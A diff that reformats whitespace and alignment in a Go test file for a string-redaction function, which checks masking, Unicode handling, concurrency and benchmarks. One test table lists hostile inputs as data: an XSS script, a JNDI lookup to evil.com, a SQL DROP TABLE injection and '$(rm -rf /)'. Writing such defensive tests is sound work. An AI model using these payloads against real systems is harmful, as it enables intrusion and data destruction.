@@ -125,7 +125,7 @@ func TestRedact(t *testing.T) {
 		t.Run(tc.name, func(t *testing.T) {
 			result := Redact(tc.input)
 			testutil.AssertEqual(t, tc.expected, result)
-			
+
 			// Verify redacted string has same visual length as input for non-empty strings
 			if tc.input != "" {
 				inputRuneCount := utf8.RuneCountInString(tc.input)
@@ -148,12 +148,12 @@ func TestRedactSecurity(t *testing.T) {
 
 		for _, input := range sensitiveInputs {
 			result := Redact(input)
-			
+
 			// Ensure no part of original input is present in result
 			if strings.Contains(result, input) {
 				t.Errorf("Redacted result contains original input: %s -> %s", input, result)
 			}
-			
+
 			// Ensure result only contains asterisks and "(empty)" for empty inputs
 			if input != "" && result != strings.Repeat("*", utf8.RuneCountInString(input)) {
 				t.Errorf("Redacted result has unexpected format: %s -> %s", input, result)
@@ -163,18 +163,18 @@ func TestRedactSecurity(t *testing.T) {
 
 	t.Run("handles malicious inputs safely", func(t *testing.T) {
 		maliciousInputs := []string{
-			"\x00\x01\x02\x03", // control characters
-			"\n\r\t",           // whitespace characters
+			"\x00\x01\x02\x03",                       // control characters
+			"\n\r\t",                                 // whitespace characters
 			"</script><script>alert('xss')</script>", // XSS attempt
 			"${jndi:ldap://evil.com/a}",              // JNDI injection
-			"'; DROP TABLE users; --",                 // SQL injection
-			"$(rm -rf /)",                             // command injection
+			"'; DROP TABLE users; --",                // SQL injection
+			"$(rm -rf /)",                            // command injection
 		}
 
 		for _, input := range maliciousInputs {
 			t.Run("malicious_input", func(t *testing.T) {
 				result := Redact(input)
-				
+
 				// Should not panic or cause issues
 				expectedLength := utf8.RuneCountInString(input)
 				actualAsterisks := strings.Count(result, "*")
@@ -185,7 +185,7 @@ func TestRedactSecurity(t *testing.T) {
 
 	t.Run("consistent output for same input", func(t *testing.T) {
 		input := "consistent-test-string"
-		
+
 		// Call Redact multiple times
 		results := make([]string, 10)
 		for i := 0; i < 10; i++ {
@@ -204,11 +204,11 @@ func TestRedactEdgeCases(t *testing.T) {
 		// Test with very long string (1MB)
 		longInput := strings.Repeat("a", 1024*1024)
 		result := Redact(longInput)
-		
+
 		expectedLength := len(longInput)
 		actualLength := len(result)
 		testutil.AssertEqual(t, expectedLength, actualLength)
-		
+
 		// Should be all asterisks
 		testutil.AssertEqual(t, strings.Repeat("*", expectedLength), result)
 	})
@@ -218,17 +218,17 @@ func TestRedactEdgeCases(t *testing.T) {
 			name  string
 			input string
 		}{
-			{"combining characters", "e\u0301"},      // é as e + combining acute
-			{"surrogate pairs", "𝕏"},                 // mathematical script X
-			{"zero width characters", "a\u200Bb"},   // zero width space
-			{"right-to-left mark", "test\u200F"},    // right-to-left mark
-			{"variation selectors", "👨‍💻"},              // man technologist emoji
+			{"combining characters", "e\u0301"},   // é as e + combining acute
+			{"surrogate pairs", "𝕏"},              // mathematical script X
+			{"zero width characters", "a\u200Bb"}, // zero width space
+			{"right-to-left mark", "test\u200F"},  // right-to-left mark
+			{"variation selectors", "👨‍💻"},        // man technologist emoji
 		}
 
 		for _, tc := range unicodeTests {
 			t.Run(tc.name, func(t *testing.T) {
 				result := Redact(tc.input)
-				
+
 				// Should not panic and should produce asterisks
 				runeCount := utf8.RuneCountInString(tc.input)
 				asteriskCount := strings.Count(result, "*")
@@ -240,16 +240,16 @@ func TestRedactEdgeCases(t *testing.T) {
 	t.Run("invalid UTF-8 sequences", func(t *testing.T) {
 		// Invalid UTF-8 byte sequences
 		invalidUTF8 := []string{
-			"\xff\xfe\xfd",     // invalid start bytes
-			"valid\xff\xfe",    // valid followed by invalid
-			"\x80\x81\x82",     // continuation bytes without start
+			"\xff\xfe\xfd",  // invalid start bytes
+			"valid\xff\xfe", // valid followed by invalid
+			"\x80\x81\x82",  // continuation bytes without start
 		}
 
 		for _, input := range invalidUTF8 {
 			t.Run("invalid_utf8", func(t *testing.T) {
 				// Should not panic
 				result := Redact(input)
-				
+
 				// Should produce some output (behavior may vary for invalid UTF-8)
 				testutil.AssertNotEqual(t, "", result)
 			})
@@ -261,7 +261,7 @@ func TestRedactConcurrency(t *testing.T) {
 	t.Run("concurrent redaction", func(t *testing.T) {
 		inputs := []string{
 			"concurrent-test-1",
-			"concurrent-test-2", 
+			"concurrent-test-2",
 			"concurrent-test-3",
 			"concurrent-test-4",
 			"concurrent-test-5",
@@ -271,7 +271,7 @@ func TestRedactConcurrency(t *testing.T) {
 		testutil.ParallelTest(t, 100, func(t *testing.T, i int) {
 			input := inputs[i%len(inputs)]
 			result := Redact(input)
-			
+
 			// Verify result format
 			expectedLength := utf8.RuneCountInString(input)
 			actualAsterisks := strings.Count(result, "*")
@@ -298,10 +298,10 @@ func TestRedactUseCases(t *testing.T) {
 		for _, tc := range secrets {
 			t.Run(tc.name, func(t *testing.T) {
 				result := Redact(tc.secret)
-				
+
 				// Should not contain original secret
 				testutil.AssertNotEqual(t, tc.secret, result)
-				
+
 				// Should be properly redacted
 				if tc.secret != "" {
 					expectedLength := utf8.RuneCountInString(tc.secret)
@@ -335,7 +335,7 @@ func BenchmarkRedact(b *testing.B) {
 
 func BenchmarkRedactConcurrent(b *testing.B) {
 	input := "concurrent-benchmark-secret-string"
-	
+
 	b.RunParallel(func(pb *testing.PB) {
 		for pb.Next() {
 			_ = Redact(input)
@@ -346,7 +346,7 @@ func BenchmarkRedactConcurrent(b *testing.B) {
 func BenchmarkRedactVeryLong(b *testing.B) {
 	// Test performance with very long strings
 	longInput := strings.Repeat("secret", 10000) // ~60KB string
-	
+
 	b.ResetTimer()
 	for i := 0; i < b.N; i++ {
 		_ = Redact(longInput)
